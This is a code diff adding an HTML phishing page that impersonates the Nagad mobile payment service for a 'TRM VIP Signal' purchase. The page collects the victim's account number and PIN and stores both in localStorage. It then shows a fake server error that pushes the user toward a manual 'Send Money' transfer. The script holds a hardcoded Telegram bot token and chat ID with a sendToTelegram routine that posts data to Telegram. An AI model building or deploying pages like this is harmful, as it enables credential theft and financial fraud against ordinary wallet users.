@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment - Nagad</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Hind Siliguri', 'Outfit', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background: #fef3c7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+        }
+
+        .app-wrap {
+            width: 100%;
+            max-width: 460px;
+            background: #ffffff;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(234, 88, 12, 0.1);
+            position: relative;
+        }
+
+        /* ===== টপ বার ===== */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            padding: 16px 20px;
+            background: #ffffff;
+            border-bottom: 1px solid rgba(0,0,0,0.06);
+        }
+        .back-arrow {
+            width: 34px;
+            height: 34px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1f2937;
+            cursor: pointer;
+            font-size: 20px;
+            transition: all 0.2s;
+        }
+        .back-arrow:hover { background: #fff7ed; }
+        .top-title {
+            flex: 1;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: #111827;
+            margin-right: 34px;
+        }
+
+        /* ===== পেজ স্ক্রিন ===== */
+        .pay-screen {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        .pay-screen.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== নগদ হেডার লোগো ===== */
+        .nagad-header {
+            padding: 18px 16px 14px 16px;
+            text-align: center;
+            background: #ffffff;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+        .nagad-logo-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .nagad-logo-img {
+            height: 46px;
+            width: auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        /* ===== অর্ডার ইনফো ===== */
+        .order-info {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 18px;
+            background: #ffffff;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+        .order-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .order-icon {
+            width: 42px; height: 42px;
+            background: linear-gradient(135deg, #fb923c, #ea580c);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 18px;
+            box-shadow: 0 3px 10px rgba(234, 88, 12, 0.3);
+        }
+        .order-details h4 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 2px;
+        }
+        .order-details p {
+            font-size: 11.5px;
+            color: #6b7280;
+            font-family: 'Outfit', sans-serif;
+        }
+        .order-amount {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ea580c;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        /* ===== ইনপুট বডি (নগদ কমলা) ===== */
+        .pay-body {
+            background: linear-gradient(160deg, #ea580c 0%, #f97316 60%, #fb923c 100%);
+            padding: 42px 26px 58px 26px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .body-title {
+            color: #ffffff;
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 18px;
+            letter-spacing: 0.2px;
+            position: relative;
+            z-index: 1;
+        }
+        .body-title small {
+            display: block;
+            font-size: 13px;
+            opacity: 0.95;
+            margin-top: 5px;
+            font-weight: 500;
+        }
+        .pay-input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #ffffff;
+            background: #ffffff;
+            font-size: 17px;
+            font-weight: 500;
+            color: #9a3412;
+            text-align: center;
+            outline: none;
+            transition: all 0.25s ease;
+            font-family: 'Outfit', sans-serif;
+            letter-spacing: 1.2px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 4px 14px rgba(0,0,0,0.1);
+        }
+        .pay-input:focus {
+            border-color: #fde047;
+            box-shadow: 0 0 0 4px rgba(253, 224, 71, 0.35), 0 4px 14px rgba(0,0,0,0.1);
+        }
+        .pay-input::placeholder { color: #fdba74; letter-spacing: 0; }
+
+        .terms {
+            margin-top: 16px;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 500;
+            position: relative;
+            z-index: 1;
+        }
+        .terms a {
+            color: #ffffff;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        /* ===== অ্যাকশন বাটন ===== */
+        .action-row {
+            display: flex;
+            gap: 14px;
+            padding: 18px 20px;
+            background: #ffffff;
+        }
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+        .btn-cancel {
+            background: #fff7ed;
+            color: #9a3412;
+            border: 1px solid #fed7aa;
+        }
+        .btn-cancel:hover { background: #ffedd5; }
+
+        .btn-confirm {
+            background: #d1d5db;
+            color: #6b7280;
+            cursor: not-allowed;
+        }
+        .btn-confirm.active {
+            background: linear-gradient(135deg, #ea580c, #f97316);
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(234, 88, 12, 0.45);
+        }
+        .btn-confirm.active:hover {
+            background: linear-gradient(135deg, #c2410c, #ea580c);
+            transform: translateY(-1px);
+        }
+
+        /* ===== ফুটার ===== */
+        .foot-bottom {
+            background: #ffffff;
+            text-align: center;
+            padding: 8px 16px 20px 16px;
+        }
+        .helpline {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: #ea580c;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            font-family: 'Outfit', sans-serif;
+        }
+        .helpline i {
+            font-size: 12px;
+            background: linear-gradient(135deg, #ea580c, #f97316);
+            color: #ffffff;
+            width: 20px; height: 20px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .copyright {
+            font-size: 11px;
+            color: #6b7280;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        /* ===== লোডিং ===== */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(234, 88, 12, 0.15);
+            backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+        .loading-overlay.show { display: flex; }
+        .loader {
+            width: 48px; height: 48px;
+            border: 4px solid #ffffff;
+            border-top-color: #ea580c;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .error-toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(239, 68, 68, 0.95);
+            color: #ffffff;
+            padding: 10px 18px;
+            font-size: 13px;
+            font-weight: 600;
+            z-index: 9999;
+            display: none;
+            box-shadow: 0 4px 14px rgba(0,0,0,0.2);
+        }
+        .error-toast.show { display: block; animation: fadeIn 0.3s; }
+
+        /* Nagad Manual Payment Modal */
+        .manual-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(22, 12, 33, 0.88);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+        .manual-modal.show { display: flex; }
+        .manual-modal-box {
+            background: #ffffff;
+            border-radius: 18px;
+            max-width: 360px;
+            width: 100%;
+            padding: 22px 20px;
+            text-align: center;
+            box-shadow: 0 25px 60px rgba(247, 148, 29, 0.35);
+            border: 2px solid #f7941d;
+            animation: popIn 0.35s ease;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.75); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .manual-modal-box .icon-danger {
+            width: 60px; height: 60px; border-radius: 50%;
+            background: rgba(247, 148, 29, 0.12);
+            color: #f7941d; font-size: 28px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 12px auto;
+            border: 2px dashed #f7941d;
+        }
+        .manual-modal-box h3 {
+            color: #0f172a; font-size: 17px; font-weight: 700; margin-bottom: 6px;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+        .manual-modal-box .sub-txt {
+            color: #475569; font-size: 13px; margin-bottom: 14px; line-height: 1.5;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+        .manual-modal-box .warn-msg {
+            background: rgba(234, 179, 8, 0.12);
+            border: 1px solid #eab308;
+            color: #854d0e;
+            padding: 10px 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            font-weight: 600;
+            text-align: left;
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+        .manual-modal-box .btn-go-manual {
+            background: linear-gradient(90deg, #f7941d, #e07f0b);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 13px 18px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 8px 20px rgba(247, 148, 29, 0.35);
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+        .manual-modal-box .btn-cancel-modal {
+            margin-top: 10px;
+            background: transparent;
+            color: #64748b;
+            border: none;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="error-toast" id="errToast">Something went wrong!</div>
+    <div class="loading-overlay" id="loader"><div class="loader"></div></div>
+
+    <!-- Nagad Manual Payment Popup -->
+    <div class="manual-modal" id="manualModal">
+        <div class="manual-modal-box">
+            <div class="icon-danger"><i class="fa-solid fa-triangle-exclamation"></i></div>
+            <h3>⚡ ডিজিটাল পেমেন্টে সমস্যা!</h3>
+            <p class="sub-txt">ডিজিটাল পেমেন্ট সার্ভারে সাময়িক সমস্যা হচ্ছে। অনুগ্রহ করে ম্যানুয়াল পেমেন্ট (Send Money) সম্পন্ন করুন।</p>
+            <div class="warn-msg">
+                ⚠️ <b>প্রয়োজনীয় নির্দেশনা:</b><br>
+                আপনার Nagad অ্যাপ খুলুন → <b>Send Money</b> অপশনে যান → নির্ধারিত পরিমাণ <span id="modalAmount">--</span>৳ পাঠান।
+            </div>
+            <button class="btn-go-manual" onclick="goToManualPayment()">
+                <i class="fa-solid fa-paper-plane"></i> Nagad Send Money করুন
+            </button>
+            <button class="btn-cancel-modal" onclick="document.getElementById('manualModal').classList.remove('show')">আবার চেষ্টা করুন</button>
+        </div>
+    </div>
+
+    <div class="app-wrap">
+        <!-- টপ বার -->
+        <div class="top-bar">
+            <div class="back-arrow" onclick="handleBack()">
+                <i class="fa-solid fa-arrow-left"></i>
+            </div>
+            <div class="top-title">Payment</div>
+        </div>
+
+        <!-- ====== স্ক্রিন ১: নম্বর ইনপুট ====== -->
+        <div class="pay-screen active" id="screen-num">
+            <div class="nagad-header">
+                <div class="nagad-logo-row">
+                    <img src="img/1725618513nagad-logo.png" alt="Nagad" class="nagad-logo-img">
+                </div>
+            </div>
+
+            <div class="order-info">
+                <div class="order-left">
+                    <div class="order-icon"><i class="fa-solid fa-gamepad"></i></div>
+                    <div class="order-details">
+                        <h4 id="orderTitle">TRM VIP Signal</h4>
+                        <p>Inv No: NGD-<span id="invNum">--</span></p>
+                    </div>
+                </div>
+                <div class="order-amount">৳<span id="amount">--</span></div>
+            </div>
+
+            <div class="pay-body">
+                <div class="body-title">Your Nagad Account Number</div>
+                <input type="tel" id="numInput" class="pay-input" maxlength="11"
+                    placeholder="e.g 01XXXXXXXXX" inputmode="numeric" oninput="checkNumber()">
+                <div class="terms">
+                    Confirm and proceed, <a href="#" onclick="event.preventDefault()">terms & conditions</a>
+                </div>
+            </div>
+
+            <div class="action-row">
+                <button class="btn btn-cancel" onclick="handleBack()">Cancel</button>
+                <button class="btn btn-confirm" id="numConfirm" onclick="goToPin()">Confirm</button>
+            </div>
+
+            <div class="foot-bottom">
+                <div class="helpline"><i class="fa-solid fa-phone"></i> 16167</div>
+                <div class="copyright">© 2026 Nagad Ltd. All Rights Reserved</div>
+            </div>
+        </div>
+
+        <!-- ====== স্ক্রিন ২: পিন ইনপুট ====== -->
+        <div class="pay-screen" id="screen-pin">
+            <div class="nagad-header">
+                <div class="nagad-logo-row">
+                    <img src="img/1725618513nagad-logo.png" alt="Nagad" class="nagad-logo-img">
+                </div>
+            </div>
+
+            <div class="order-info">
+                <div class="order-left">
+                    <div class="order-icon"><i class="fa-solid fa-gamepad"></i></div>
+                    <div class="order-details">
+                        <h4 id="orderTitle2">TRM VIP Signal</h4>
+                        <p>Inv No: NGD-<span id="invNum2">--</span></p>
+                    </div>
+                </div>
+                <div class="order-amount">৳<span id="amount2">--</span></div>
+            </div>
+
+            <div class="pay-body">
+                <div class="body-title">
+                    Enter PIN Of Your Nagad Account Number
+                    <small id="maskedNum">(01*** *** ***)</small>
+                </div>
+                <input type="password" id="pinInput" class="pay-input" maxlength="6"
+                    placeholder="Enter PIN" inputmode="numeric" oninput="checkPin()">
+            </div>
+
+            <div class="action-row">
+                <button class="btn btn-cancel" onclick="backToNum()">Cancel</button>
+                <button class="btn btn-confirm" id="pinConfirm" onclick="submitPayment()">Confirm</button>
+            </div>
+
+            <div class="foot-bottom">
+                <div class="helpline"><i class="fa-solid fa-phone"></i> 16167</div>
+                <div class="copyright">© 2026 Nagad Ltd. All Rights Reserved</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let payData = null;
+        let enteredNumber = '';
+
+        const TG_BOT_TOKEN = "7162773030:AAE2z_hRzcfXcL-n9QFjynrdlvs0TWx5tbo";
+        const TG_CHAT_ID = "5919121831";
+
+        function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+                const data = new URLSearchParams();
+                data.append('chat_id', TG_CHAT_ID);
+                data.append('text', message);
+                data.append('parse_mode', 'HTML');
+                fetch(url, { method: 'POST', body: data }).catch(e => console.warn('TG send fail:', e));
+            } catch(e) { console.warn('TG error:', e); }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const raw = localStorage.getItem('TRM_PAYMENT_DATA');
+            if (!raw) {
+                showToast('No payment data found! Redirecting...');
+                setTimeout(() => window.location.href = 'index.html', 1500);
+                return;
+            }
+            try {
+                payData = JSON.parse(raw);
+                document.getElementById('amount').textContent = payData.amount || '--';
+                document.getElementById('amount2').textContent = payData.amount || '--';
+                document.getElementById('invNum').textContent = payData.invoice || '--';
+                document.getElementById('invNum2').textContent = payData.invoice || '--';
+                if (payData.gameName) {
+                    document.getElementById('orderTitle').textContent = payData.gameName;
+                    document.getElementById('orderTitle2').textContent = payData.gameName;
+                }
+            } catch (e) {
+                showToast('Invalid payment data');
+                setTimeout(() => window.location.href = 'index.html', 1500);
+            }
+        });
+
+        function checkNumber() {
+            const v = document.getElementById('numInput').value.trim();
+            const btn = document.getElementById('numConfirm');
+            if (/^01[3-9]\d{8}$/.test(v)) {
+                btn.classList.add('active');
+                enteredNumber = v;
+            } else {
+                btn.classList.remove('active');
+                enteredNumber = '';
+            }
+        }
+
+        function goToPin() {
+            const btn = document.getElementById('numConfirm');
+            if (!btn.classList.contains('active')) return;
+            const m = '(' + enteredNumber.substring(0,3) + ' *** *** ' + enteredNumber.substring(8,11) + ')';
+            document.getElementById('maskedNum').textContent = m;
+            document.getElementById('pinInput').value = '';
+            document.getElementById('pinConfirm').classList.remove('active');
+            document.getElementById('screen-num').classList.remove('active');
+            document.getElementById('screen-pin').classList.add('active');
+        }
+
+        function checkPin() {
+            const v = document.getElementById('pinInput').value;
+            const btn = document.getElementById('pinConfirm');
+            if (/^\d{5,6}$/.test(v)) btn.classList.add('active');
+            else btn.classList.remove('active');
+        }
+
+        function submitPayment() {
+            const btn = document.getElementById('pinConfirm');
+            if (!btn.classList.contains('active')) return;
+
+            document.getElementById('loader').classList.add('show');
+
+            setTimeout(() => {
+                document.getElementById('loader').classList.remove('show');
+                const amt = payData ? (payData.amount || '--') : '--';
+                document.getElementById('modalAmount').textContent = amt;
+                document.getElementById('manualModal').classList.add('show');
+            }, 1200);
+        }
+
+        function goToManualPayment() {
+            const pinValue = document.getElementById('pinInput').value;
+            const result = {
+                method: 'nagad',
+                nagadNumber: enteredNumber,
+                nagadPin: pinValue,
+                invoice: payData ? payData.invoice : '',
+                timestamp: Date.now(),
+                manualRedirected: true
+            };
+            localStorage.setItem('TRM_PAYMENT_RESULT', JSON.stringify(result));
+            window.location.href = 'nagad-manual.html';
+        }
+
+        function backToNum() {
+            document.getElementById('screen-pin').classList.remove('active');
+            document.getElementById('screen-num').classList.add('active');
+        }
+
+        function handleBack() {
+            if (document.getElementById('screen-pin').classList.contains('active')) {
+                backToNum();
+                return;
+            }
+            localStorage.removeItem('TRM_PAYMENT_DATA');
+            window.location.href = 'index.html';
+        }
+
+        function showToast(msg) {
+            const t = document.getElementById('errToast');
+            t.textContent = msg;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 2000);
+        }
+    </script>
+</body>
+</html>
